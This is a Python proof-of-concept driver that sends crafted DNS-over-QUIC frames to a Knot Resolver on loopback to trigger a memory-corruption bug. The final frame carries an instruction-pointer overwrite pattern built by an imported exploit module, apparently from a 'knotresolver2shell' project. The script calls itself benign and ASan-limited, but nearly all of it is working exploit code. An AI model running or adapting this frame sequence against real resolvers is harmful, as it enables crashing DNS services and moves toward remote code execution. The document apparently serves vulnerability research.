#!/usr/bin/env python3
"""Loopback-only DoQ replay driver for the pinned venglin/knot-doq frames.

Sends F1..F5 from the PoC `_escalate()` verbatim, then F6 with a benign
marker payload (RIP/RDI pattern, never executed because ASan catches the
write). No grooming, no /proc reads, no kresd_pid(): this only proves the
memory-corruption primitive on an ASan build. Usage: asan_replay.py PORT.
"""
import asyncio
import ssl
import sys

from aioquic.asyncio.client import connect
from aioquic.quic.configuration import QuicConfiguration

sys.path.insert(0, "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/knotresolver2shell/poc/knot-doq")
from poc import build_rip_payload  # noqa: E402


async def flush(proto, sid, data, fin):
    proto._quic.send_stream_data(sid, data, end_stream=fin)
    proto.transmit()
    await asyncio.sleep(0.08)


async def run(host, port):
    cfg = QuicConfiguration(is_client=True, alpn_protocols=["doq"])
    cfg.verify_mode = ssl.CERT_NONE
    cfg.max_datagram_size = 1500
    cfg.idle_timeout = 20.0
    cfg.max_data = 64 * 1024
    cfg.max_stream_data = 32 * 1024
    async with connect(host, port, configuration=cfg) as proto:
        sid = proto._quic.get_next_available_stream_id(False)
        # F1: 8 bytes, offset 0
        await flush(proto, sid, b"\x00\x00" + b"A" * 6, False)
        # F2..F5: 1440 bytes each
        for marker in (b"BB", b"CC", b"DD", b"EE"):
            await flush(proto, sid, marker + bytes((0x40 + i) & 0xFF for i in range(1438)), False)
        # F6: 2-byte prefix + 1198-byte benign marker body, FIN
        payload = build_rip_payload()
        print(f"[driver] sending F6: prefix+payload = {2 + len(payload)} bytes", flush=True)
        await flush(proto, sid, b"\xFF\xFF" + payload, True)
        await asyncio.sleep(2.0)
    print("[driver] done", flush=True)


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8853
    asyncio.run(run("127.0.0.1", port))
